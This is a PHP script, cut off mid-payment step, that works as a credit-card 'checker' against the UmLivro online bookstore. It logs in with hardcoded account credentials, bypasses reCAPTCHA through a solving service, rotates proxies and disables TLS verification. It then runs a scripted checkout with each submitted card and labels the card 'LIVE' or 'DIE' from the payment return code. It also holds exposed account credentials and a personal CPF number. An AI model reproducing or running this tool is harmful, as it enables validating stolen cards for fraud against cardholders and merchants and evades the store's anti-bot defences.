<?php
/**
 * API - UmLivro (REDE)
 * 
 * SAÍDA PURA (TEXTO) NO FORMATO:
 * ✅ LIVE ~>cartao|mes|ano|cvv ~> Codigo: [returnCode] ~> mensagem
 * ❌ DIE  ~>cartao|mes|ano|cvv ~> Codigo: [returnCode] ~> mensagem
 * 
 * DEBUG completo em logs/umlivro_debug_YYYY-MM-DD.txt e debug.txt (pasta raiz)
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

session_start();

$logDir = __DIR__ . '/../logs';
if (!file_exists($logDir)) {
    mkdir($logDir, 0777, true);
}

// =====================================================
// ✅ CONFIGURAÇÕES UMLIVRO
// =====================================================
define('BASE_URL', 'https://loja.umlivro.com.br');
define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
define('PASSWORD', '00998877mN');
define('ACCOUNT_NAME', 'umlivro');
define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');

define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36');

// ==================== DADOS DO PRODUTO ====================
define('PRODUCT_SKU', '1883447');
define('PRODUCT_SELLER', 1);
define('PRODUCT_QUANTITY', 1);

// ==================== DADOS DO CLIENTE ====================
define('CLIENT_FIRST_NAME', 'ALYSON');
define('CLIENT_LAST_NAME', 'bvasda');
define('CLIENT_DOCUMENT', '08471416832');
define('CLIENT_PHONE', '11999999999');

// ==================== DADOS DO ENDEREÇO ====================
define('SHIPPING_POSTAL_CODE', '07790-515');
define('SHIPPING_CITY', 'Cajamar');
define('SHIPPING_STATE', 'SP');
define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
define('SHIPPING_NUMBER', 'ew23');
define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
define('SHIPPING_COMPLEMENT', '');
define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
define('SHIPPING_COUNTRY', 'BRA');

// ==================== CAPMONSTER ====================
define('CAPMONSTER_API_KEY', 'SUA_KEY_AQUI');
define('CAPMONSTER_API_URL', 'https://api.capmonster.cloud');

// ==================== REGRAS DE CATEGORIZAÇÃO ====================
define('LIVE_CODES', ['0000', '1001', '1002', '1016', '1045', '1012', '2001', '2002', '9124', '-1003']);

function categorizarReturnCode($returnCode, $bin = null) {
    $returnCode = (string)$returnCode;
    foreach (LIVE_CODES as $code) {
        if (strtoupper($returnCode) === strtoupper((string)$code)) {
            return 'live';
        }
    }
    return 'die';
}

function extrairReturnCode($mensagem) {
    if (preg_match('/ReturnCode:([^\s-]+)/', $mensagem, $matches)) {
        return trim($matches[1]);
    }
    if (preg_match('/code:([-\d]+)/', $mensagem, $matches)) {
        return $matches[1];
    }
    if (preg_match('/ReturnCode:([-\d]+)/', $mensagem, $matches)) {
        return $matches[1];
    }
    return null;
}

function extrairAcquirer($mensagem) {
    if (preg_match('/acquirer:([^\s-]+)/', $mensagem, $matches)) {
        return $matches[1];
    }
    return 'Pagarme';
}

// =====================================================
// PROXY
// =====================================================
function getProxyConfig() {
    $proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? null;
    if (empty($proxy)) return null;
    
    $parts = explode(':', $proxy);
    if (count($parts) >= 4) {
        return ['host' => $parts[0], 'port' => $parts[1], 'user' => $parts[2], 'pass' => $parts[3]];
    } elseif (count($parts) >= 2) {
        return ['host' => $parts[0], 'port' => $parts[1], 'user' => null, 'pass' => null];
    }
    return null;
}

function configureCurlWithProxy($ch, $proxyConfig) {
    if (empty($proxyConfig)) return $ch;
    
    $proxyStr = $proxyConfig['host'] . ':' . $proxyConfig['port'];
    curl_setopt($ch, CURLOPT_PROXY, $proxyStr);
    
    if (!empty($proxyConfig['user']) && !empty($proxyConfig['pass'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['user'] . ':' . $proxyConfig['pass']);
        curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
    }
    
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    debugLog("🌐 Proxy configurado: {$proxyConfig['host']}:{$proxyConfig['port']}");
    return $ch;
}

// =====================================================
// FUNÇÕES AUXILIARES
// =====================================================
function gerarUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function gerarDeviceFingerprint($cardNumber = null) {
    $data = [
        'userAgent' => USER_AGENT,
        'timestamp' => microtime(true),
        'random' => mt_rand(100000, 999999),
        'cardPrefix' => $cardNumber ? substr($cardNumber, 0, 6) : ''
    ];
    return md5(json_encode($data));
}

function buildCookieString($cookies) {
    $parts = [];
    foreach ($cookies as $name => $value) {
        $parts[] = $name . '=' . $value;
    }
    return implode('; ', $parts);
}

function extrairCookies($headerStr) {
    $cookies = [];
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headerStr, $matches);
    foreach ($matches[1] as $cookie) {
        $parts = explode('=', $cookie, 2);
        if (count($parts) === 2) {
            $cookies[trim($parts[0])] = urldecode(trim($parts[1]));
        }
    }
    return $cookies;
}

function mesclarCookies($existing, $new) {
    foreach ($new as $name => $value) {
        $existing[$name] = $value;
    }
    return $existing;
}

// =====================================================
// DEBUG ULTRADETALHADO
// =====================================================
function debugLog($message, $data = null, $level = 'INFO', $context = []) {
    global $logDir;
    $ts = date('Y-m-d H:i:s');
    $entry = "[$ts] [$level] $message";
    
    if (!empty($context)) {
        $entry .= " | " . json_encode($context, JSON_UNESCAPED_UNICODE);
    }
    
    if ($data !== null) {
        $entry .= "\n" . (is_array($data) || is_object($data)
            ? json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)
            : $data);
    }
    $entry .= "\n" . str_repeat('-', 80) . "\n";
    
    @file_put_contents($logDir . '/umlivro_debug_' . date('Y-m-d') . '.txt', $entry, FILE_APPEND);
    @file_put_contents(__DIR__ . '/Logs/debug.txt', $entry, FILE_APPEND);
}

function logCookies($cookies, $label = '🍪 Cookies') {
    $safe = [];
    foreach ($cookies as $key => $value) {
        if (strpos($key, 'AutCookie') !== false || strpos($key, 'vtex_session') !== false) {
            $safe[$key] = substr($value, 0, 30) . '...';
        } else {
            $safe[$key] = $value;
        }
    }
    debugLog($label, $safe, 'DEBUG');
}

function debugResponse($name, $response) {
    debugLog("=== RESPONSE: $name ===");
    debugLog("Status: " . ($response['status'] ?? 'N/A'));
    debugLog("Headers: " . substr($response['headers'] ?? '', 0, 800));
    debugLog("Body (primeiros 1000 caracteres): " . substr($response['body'] ?? '', 0, 1000));
}

// =====================================================
// FUNÇÃO DE REQUISIÇÃO COM LOG DETALHADO
// =====================================================
function fazerRequest($url, $method = 'GET', $data = null, $extraHeaders = [], $cookies = [], $logName = null) {
    global $proxyConfig;
    
    if (!empty($url) && strpos($url, 'http') !== 0 && strpos($url, '/') === 0) {
        $url = BASE_URL . $url;
    }

    debugLog("📤 REQUEST [$logName]", [
        'url' => $url,
        'method' => $method,
        'headers' => $extraHeaders,
        'data' => $data,
        'cookies' => array_keys($cookies)
    ], 'DEBUG');

    $ch = curl_init($url);

    $headers = [
        'User-Agent: ' . USER_AGENT,
        'Accept: application/json, text/plain, */*',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding: gzip, deflate',
        'Origin: ' . BASE_URL,
        'Cache-Control: no-cache',
        'Pragma: no-cache',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
    ];

    if (!empty($cookies)) {
        $cookieStr = buildCookieString($cookies);
        $headers[] = 'Cookie: ' . $cookieStr;
        debugLog("🍪 Cookie enviado: " . substr($cookieStr, 0, 200) . '...', null, 'DEBUG');
    }

    $headers = array_merge($headers, $extraHeaders);

    if (!empty($proxyConfig)) {
        $ch = configureCurlWithProxy($ch, $proxyConfig);
    }

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CONNECTTIMEOUT => 30,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_HEADER => true,
        CURLOPT_ENCODING => 'gzip, deflate',
    ]);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    } elseif ($method === 'PATCH') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
        if ($data !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }

    $start = microtime(true);
    $response = curl_exec($ch);
    $duration = microtime(true) - $start;
    $error = curl_error($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($error) {
        debugLog("❌ cURL Error: $error", null, 'ERROR');
        return ['status' => 0, 'headers' => '', 'body' => '', 'error' => $error];
    }

    $result = [
        'status' => $httpCode,
        'headers' => substr($response, 0, $headerSize),
        'body' => substr($response, $headerSize),
    ];

    debugLog("📥 RESPONSE [$logName] em {$duration}s", [
        'status' => $httpCode,
        'headers_preview' => substr($result['headers'], 0, 500),
        'body_preview' => substr($result['body'], 0, 500)
    ], 'DEBUG');

    if ($logName) debugResponse($logName, $result);

    return $result;
}

// =====================================================
// FUNÇÕES DE SESSÃO
// =====================================================
function sessaoEstaAtiva() {
    if (!isset($_SESSION['logged_in_umlivro']) || $_SESSION['logged_in_umlivro'] !== true) {
        return false;
    }
    if (time() - ($_SESSION['login_time_umlivro'] ?? 0) > 86400) {
        return false;
    }
    return true;
}

// =====================================================
// LOGIN COM SENHA
// =====================================================
function doLogin() {
    ob_start();
    debugLog("=== DO_LOGIN UMLIVRO ===");
    debugLog("👤 Tentando login com: " . EMAIL);
    
    $cookies = [];
    
    if (empty($cookies['VtexRCSessionIdv7'])) {
        $cookies['VtexRCSessionIdv7'] = gerarUUID();
    }
    if (empty($cookies['VtexRCMacIdv7'])) {
        $cookies['VtexRCMacIdv7'] = gerarUUID();
    }
    
    try {
        // PASSO 1: GET /login
        debugLog("📌 PASSO 1: GET /login");
        $response = fazerRequest('/login', 'GET', null, [
            'Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ], $cookies, 'LOGIN_PAGE');
        
        if ($response['status'] !== 200) {
            echo "❌ LOGIN FALHOU: Falha ao acessar página de login\n";
            exit;
        }
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        logCookies($cookies, '🍪 Cookies após GET /login');
        
        // PASSO 2: POST /api/vtexid/pub/authentication/start
        debugLog("📌 PASSO 2: POST /start");
        $startBody = http_build_query([
            'callbackUrl' => BASE_URL . '/api/vtexid/oauth/finish?popup=true',
            'scope' => ACCOUNT_NAME,
            'user' => '',
            'locale' => 'pt-BR',
            'accountName' => '',
            'returnUrl' => BASE_URL . '/',
            'appStart' => 'true',
            'method' => 'POST'
        ]);
        
        $response = fazerRequest(
            '/api/vtexid/pub/authentication/start',
            'POST',
            $startBody,
            [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'vtex-id-ui-version: 3.28.0',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'START'
        );
        
        if ($response['status'] !== 200) {
            echo "❌ LOGIN FALHOU: Falha ao iniciar autenticação\n";
            exit;
        }
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        $authData = json_decode($response['body'], true);
        $authenticationToken = $authData['authenticationToken'] ?? '';
        debugLog("🔑 Authentication Token: " . substr($authenticationToken, 0, 30) . "...");
        
        if (empty($authenticationToken)) {
            echo "❌ LOGIN FALHOU: Token de autenticação não obtido\n";
            exit;
        }
        
        // PASSO 3: POST /api/vtexid/pub/authentication/classic/validate
        debugLog("📌 PASSO 3: POST /classic/validate");
        $fingerprint = gerarDeviceFingerprint();
        
        $validateBody = http_build_query([
            'recaptcha' => '',
            'login' => EMAIL,
            'authenticationToken' => $authenticationToken,
            'password' => PASSWORD,
            'fingerprint' => $fingerprint,
            'method' => 'POST'
        ]);
        
        $response = fazerRequest(
            '/api/vtexid/pub/authentication/classic/validate',
            'POST',
            $validateBody,
            [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'vtex-id-ui-version: 3.28.0',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'VALIDATE'
        );
        
        if ($response['status'] !== 200) {
            echo "❌ LOGIN FALHOU: Falha na validação\n";
            exit;
        }
        
        $authResult = json_decode($response['body'], true);
        if (($authResult['authStatus'] ?? '') !== 'Success') {
            echo "❌ LOGIN FALHOU: Credenciais inválidas\n";
            exit;
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        $authCookie = $authResult['authCookie']['Value'] ?? null;
        $accountAuthCookie = $authResult['accountAuthCookie']['Value'] ?? null;
        $userId = $authResult['userId'] ?? null;
        
        if ($authCookie) {
            $cookies['VtexIdclientAutCookie_' . ACCOUNT_NAME] = $authCookie;
        }
        if ($accountAuthCookie) {
            $cookies['VtexIdclientAutCookie_' . ACCOUNT_ID] = $accountAuthCookie;
        }
        
        debugLog("✅ Login bem-sucedido! userId: $userId");
        logCookies($cookies, '🍪 Cookies após VALIDATE');
        
        // PASSO 4: PATCH /api/sessions
        debugLog("📌 PASSO 4: PATCH /api/sessions");
        $response = fazerRequest(
            '/api/sessions',
            'PATCH',
            '{}',
            ['Content-Type: application/json', 'X-Requested-With: XMLHttpRequest'],
            $cookies,
            'PATCH_SESSIONS'
        );
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        $sessionData = json_decode($response['body'], true);
        if (!empty($sessionData['sessionToken'])) {
            $cookies['vtex_session'] = $sessionData['sessionToken'];
        }
        if (!empty($sessionData['segmentToken'])) {
            $cookies['vtex_segment'] = $sessionData['segmentToken'];
        }
        logCookies($cookies, '🍪 Cookies após PATCH sessions');
        
        // PASSO 5: POST /api/sessions/?items=profile.isAuthenticated
        debugLog("📌 PASSO 5: POST /sessions?items=profile.isAuthenticated");
        $response = fazerRequest(
            '/api/sessions/?items=profile.isAuthenticated',
            'POST',
            '{"public":{}}',
            [
                'Content-Type: application/json',
                'vtex-session-ui-version: session-portal@1.2.2',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'VERIFY_AUTH'
        );
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        // PASSO 6: GET / (home)
        debugLog("📌 PASSO 6: GET /");
        $response = fazerRequest('/', 'GET', null, [
            'Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ], $cookies, 'HOME_PAGE');
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        // ✅ SALVA COOKIES
        $cookieFile = __DIR__ . '/../logs/cookies_umlivro_' . date('Y-m-d_H-i-s') . '.json';
        file_put_contents($cookieFile, json_encode($cookies, JSON_PRETTY_PRINT));
        
        $_SESSION['cookies_umlivro'] = $cookies;
        $_SESSION['cookies_file_umlivro'] = $cookieFile;
        $_SESSION['logged_in_umlivro'] = true;
        $_SESSION['login_time_umlivro'] = time();
        $_SESSION['user_name_umlivro'] = 'ALYSON';
        $_SESSION['user_email_umlivro'] = EMAIL;
        $_SESSION['userProfileId'] = $userId;
        
        debugLog("✅ Login realizado com sucesso!");
        debugLog("📁 Cookie file: $cookieFile");
        debugLog("👤 userProfileId: $userId");
        
        echo "✅ LOGIN REALIZADO COM SUCESSO! Sessão ativa.\n";
        echo "Usuário: ALYSON\n";
        echo "Email: " . EMAIL . "\n";
        echo "userProfileId: $userId\n";
        echo "Cookie file: $cookieFile\n";
        exit;
        
    } catch (Exception $e) {
        debugLog("💥 EXCEÇÃO NO LOGIN", [
            'message' => $e->getMessage(),
            'file' => $e->getFile(),
            'line' => $e->getLine(),
            'trace' => $e->getTraceAsString()
        ], 'ERROR');
        echo "❌ ERRO NO LOGIN: " . $e->getMessage() . "\n";
        exit;
    }
}

// =====================================================
// CAPMONSTER - Resolução de reCAPTCHA V2
// =====================================================
function resolverRecaptchaCapmonster($siteKey, $pageUrl) {
    debugLog("🔐 CapMonster V2 | siteKey=$siteKey | url=$pageUrl");

    $payload = json_encode([
        'clientKey' => CAPMONSTER_API_KEY,
        'task' => [
            'type' => 'NoCaptchaTaskProxyless',
            'websiteURL' => $pageUrl,
            'websiteKey' => $siteKey,
        ],
    ]);

    debugLog("📤 CapMonster Payload: " . $payload);

    $ch = curl_init(CAPMONSTER_API_URL . '/createTask');
    
    global $proxyConfig;
    if (!empty($proxyConfig)) {
        $ch = configureCurlWithProxy($ch, $proxyConfig);
    }
    
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    ]);
    
    $createResultRaw = curl_exec($ch);
    $createError = curl_error($ch);
    curl_close($ch);
    
    if ($createError) {
        debugLog("❌ CapMonster cURL Error: $createError", null, 'ERROR');
        return null;
    }
    
    debugLog("📥 CapMonster Create Response: " . $createResultRaw);
    
    $createResult = json_decode($createResultRaw, true);
    if (!$createResult) {
        debugLog("❌ CapMonster JSON decode failed", null, 'ERROR');
        return null;
    }

    $taskId = $createResult['taskId'] ?? null;
    if (empty($taskId) || ($createResult['errorId'] ?? 0) !== 0) {
        debugLog("❌ CapMonster falhou: " . ($createResult['errorDescription'] ?? 'N/A'), null, 'WARN');
        return null;
    }
    
    debugLog("✅ CapMonster Task ID: $taskId");

    for ($i = 0; $i < 30; $i++) {
        debugLog("⏳ Polling CapMonster (tentativa " . ($i+1) . "/30)");
        sleep(3);
        
        $poll = json_encode(['clientKey' => CAPMONSTER_API_KEY, 'taskId' => $taskId]);
        $ch = curl_init(CAPMONSTER_API_URL . '/getTaskResult');
        
        if (!empty($proxyConfig)) {
            $ch = configureCurlWithProxy($ch, $proxyConfig);
        }
        
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $poll,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        ]);
        
        $pollResultRaw = curl_exec($ch);
        $pollError = curl_error($ch);
        curl_close($ch);
        
        if ($pollError) {
            debugLog("❌ CapMonster Poll cURL Error: $pollError", null, 'ERROR');
            continue;
        }
        
        $pollResult = json_decode($pollResultRaw, true);
        if (!$pollResult) {
            debugLog("❌ CapMonster Poll JSON decode failed", null, 'ERROR');
            continue;
        }

        $status = $pollResult['status'] ?? '';
        debugLog("📥 CapMonster Poll Status: $status");
        
        if ($status === 'ready') {
            $token = $pollResult['solution']['gRecaptchaResponse'] ?? null;
            if ($token) {
                debugLog("✅ Token obtido: " . substr($token, 0, 40) . "...");
                return $token;
            }
        }
        if ($status === 'failed' || ($pollResult['errorId'] ?? 0) > 0) {
            debugLog("❌ CapMonster falhou no poll: " . ($pollResult['errorDescription'] ?? 'N/A'), null, 'WARN');
            break;
        }
    }
    
    debugLog("❌ CapMonster timeout ou falha", null, 'ERROR');
    return null;
}

// =====================================================
// EXTRAIR PRICE TOKEN DA PÁGINA DO PRODUTO
// =====================================================
function extrairPriceToken($html) {
    debugLog("🔍 Extraindo priceToken do HTML...");
    
    if (preg_match('/var\s+skuJson(?:_\d+)?\s*=\s*({[^;]+});/', $html, $matches)) {
        $skuData = json_decode($matches[1], true);
        if ($skuData && !empty($skuData['skus'][0]['priceToken'])) {
            return [
                'priceToken' => $skuData['skus'][0]['priceToken'],
                'sku' => $skuData['skus'][0]['sku'],
                'bestPrice' => $skuData['skus'][0]['bestPrice'],
                'seller' => $skuData['skus'][0]['sellerId'] ?? 1
            ];
        }
    }
    
    if (preg_match('/"priceToken":"([^"]+)"/', $html, $matches)) {
        return [
            'priceToken' => $matches[1],
            'sku' => 1883447,
            'bestPrice' => 4190,
            'seller' => 1
        ];
    }
    
    return null;
}

// =====================================================
// EXECUTAR CHECKOUT COMPLETO
// =====================================================
function executarCheckoutCompleto($cookies, $cardData, $productUrl, $cartaoRaw) {
    global $logDir;

    $startTotal = microtime(true);
    debugLog("=== INICIANDO CHECKOUT UMLIVRO ===");
    debugLog("📦 Produto: " . $productUrl);
    debugLog("💳 Cartão: " . substr($cardData['cardNumber'], 0, 4) . '****' . substr($cardData['cardNumber'], -4));
    logCookies($cookies, '🍪 Cookies iniciais checkout');
    
    $step = 0;
    $totalSteps = 12; // agora são 12 passos
    $orderFormId = null;
    $totalValue = 0;
    $recaptchaKey = null;
    $orderGroup = null;
    $transactionId = null;
    $addressId = null;
    $priceToken = null;
    $skuId = null;
    $userProfileId = $_SESSION['userProfileId'] ?? null;
    
    debugLog("👤 userProfileId da sessão: $userProfileId");
    
    $expectedSections = [
        "items","totalizers","clientProfileData","shippingData","paymentData",
        "sellers","messages","marketingData","clientPreferencesData",
        "storePreferencesData","giftRegistryData","ratesAndBenefitsData",
        "openTextField","commercialConditionData","customData"
    ];
    
    try {
        // ========== PASSO 1: GET /product ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Acessando página do produto");
        
        $productPath = $productUrl;
        if (strpos($productPath, BASE_URL) === 0) {
            $productPath = str_replace(BASE_URL, '', $productPath);
        }
        
        $response = fazerRequest($productPath, 'GET', null, [
            'Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ], $cookies, 'PRODUCT_PAGE');
        
        if ($response['status'] !== 200) {
            $msg = "Falha ao acessar produto: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        $productData = extrairPriceToken($response['body']);
        if (!$productData) {
            $msg = "Não foi possível extrair priceToken do produto";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        $priceToken = $productData['priceToken'];
        $skuId = $productData['sku'];
        $sellerId = $productData['seller'];
        debugLog("✅ PriceToken extraído: " . substr($priceToken, 0, 30) . "...");
        debugLog("✅ SKU ID: $skuId");
        
        // ========== PASSO 2: ADD TO CART ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Adicionando ao carrinho");
        
        $addUrl = "/checkout/cart/add?sku={$skuId}&qty=" . PRODUCT_QUANTITY . "&seller={$sellerId}&priceToken=" . urlencode($priceToken) . "&redirect=false&sc=1";
        
        $response = fazerRequest($addUrl, 'GET', null, [
            'Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ], $cookies, 'ADD_TO_CART');
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 3: GET /checkout/ ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Acessando checkout");
        
        $response = fazerRequest('/checkout/', 'GET', null, [
            'Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ], $cookies, 'CHECKOUT_PAGE');
        
        if ($response['status'] !== 200) {
            $msg = "Falha ao acessar checkout: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 4: POST /api/checkout/pub/orderForm ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Obtendo OrderForm");
        
        $response = fazerRequest(
            '/api/checkout/pub/orderForm?refreshOutdatedData=true',
            'POST',
            json_encode(['expectedOrderFormSections' => $expectedSections]),
            [
                'Content-Type: application/json; charset=UTF-8',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest',
                'Checkout-User-Agent: legacy@v6.151.3',
            ],
            $cookies,
            'ORDER_FORM'
        );
        
        if ($response['status'] !== 200) {
            $msg = "Falha ao obter OrderForm: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        $orderResult = json_decode($response['body'], true);
        $orderFormId = $orderResult['orderFormId'] ?? null;
        $totalValue = $orderResult['value'] ?? 0;
        $recaptchaKey = $orderResult['recaptchaKey'] ?? null;
        $userProfileId = $orderResult['userProfileId'] ?? $userProfileId;
        $_SESSION['userProfileId'] = $userProfileId; // atualiza sessão
        
        debugLog("✅ OrderForm ID: $orderFormId");
        debugLog("✅ Total: R$ " . number_format($totalValue / 100, 2, ',', '.'));
        debugLog("✅ recaptchaKey: $recaptchaKey");
        debugLog("✅ userProfileId do orderForm: $userProfileId");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        if (empty($orderFormId)) {
            $msg = "OrderFormId não obtido";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        // ========== PASSO 5: POST /attachments/clientProfileData ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Enviando dados do cliente");
        
        $clientProfilePayload = json_encode([
            'email' => EMAIL,
            'firstName' => CLIENT_FIRST_NAME,
            'lastName' => CLIENT_LAST_NAME,
            'document' => CLIENT_DOCUMENT,
            'documentType' => 'CPF',
            'phone' => CLIENT_PHONE,
            'isCorporate' => false,
            'expectedOrderFormSections' => $expectedSections
        ]);
        
        $response = fazerRequest(
            '/api/checkout/pub/orderForm/' . $orderFormId . '/attachments/clientProfileData',
            'POST',
            $clientProfilePayload,
            [
                'Content-Type: application/json; charset=UTF-8',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'CLIENT_PROFILE'
        );
        
        if ($response['status'] !== 200) {
            $msg = "Falha ao enviar dados do cliente: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        debugLog("✅ Dados do cliente enviados com sucesso");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 6: POST /attachments/shippingData (SALVA ENDEREÇO) ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Enviando dados de endereço");
        
        $shippingPayload = json_encode([
            'selectedAddresses' => [[
                'addressType' => 'residential',
                'receiverName' => SHIPPING_RECEIVER_NAME,
                'postalCode' => SHIPPING_POSTAL_CODE,
                'city' => SHIPPING_CITY,
                'state' => SHIPPING_STATE,
                'country' => SHIPPING_COUNTRY,
                'street' => SHIPPING_STREET,
                'number' => SHIPPING_NUMBER,
                'neighborhood' => SHIPPING_NEIGHBORHOOD,
                'complement' => SHIPPING_COMPLEMENT,
                'addressId' => '',  // vazio para criar novo
                'isDisposable' => false,   // SALVA NO PERFIL
                'userProfileId' => $userProfileId
            ]],
            'expectedOrderFormSections' => $expectedSections
        ]);
        
        debugLog("📦 Shipping Payload: " . $shippingPayload);
        
        $response = fazerRequest(
            '/api/checkout/pub/orderForm/' . $orderFormId . '/attachments/shippingData',
            'POST',
            $shippingPayload,
            [
                'Content-Type: application/json; charset=UTF-8',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest',
                'Checkout-User-Agent: legacy@v6.151.3',
            ],
            $cookies,
            'SHIPPING_DATA'
        );
        
        if ($response['status'] !== 200) {
            $msg = "Falha ao enviar endereço: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        $shippingResult = json_decode($response['body'], true);
        
        if (!empty($shippingResult['shippingData']['selectedAddresses'][0]['addressId'])) {
            $addressId = $shippingResult['shippingData']['selectedAddresses'][0]['addressId'];
        }
        
        $totalValue = $shippingResult['value'] ?? $totalValue;
        debugLog("✅ Endereço enviado com sucesso, addressId: $addressId");
        debugLog("✅ Total com frete: R$ " . number_format($totalValue / 100, 2, ',', '.'));
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 7: POST /attachments/paymentData ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Enviando dados de pagamento");
        
        $paymentPayload = json_encode([
            'payments' => [[
                'hasDefaultBillingAddress' => true,
                'isLuhnValid' => true,
                'installmentsInterestRate' => 0,
                'referenceValue' => $totalValue,
                'bin' => $cardData['bin'],
                'accountId' => null,
                'value' => $totalValue,
                'tokenId' => null,
                'paymentSystem' => '4',
                'installments' => 1,
                'isRegexValid' => true,
            ]],
            'giftCards' => [],
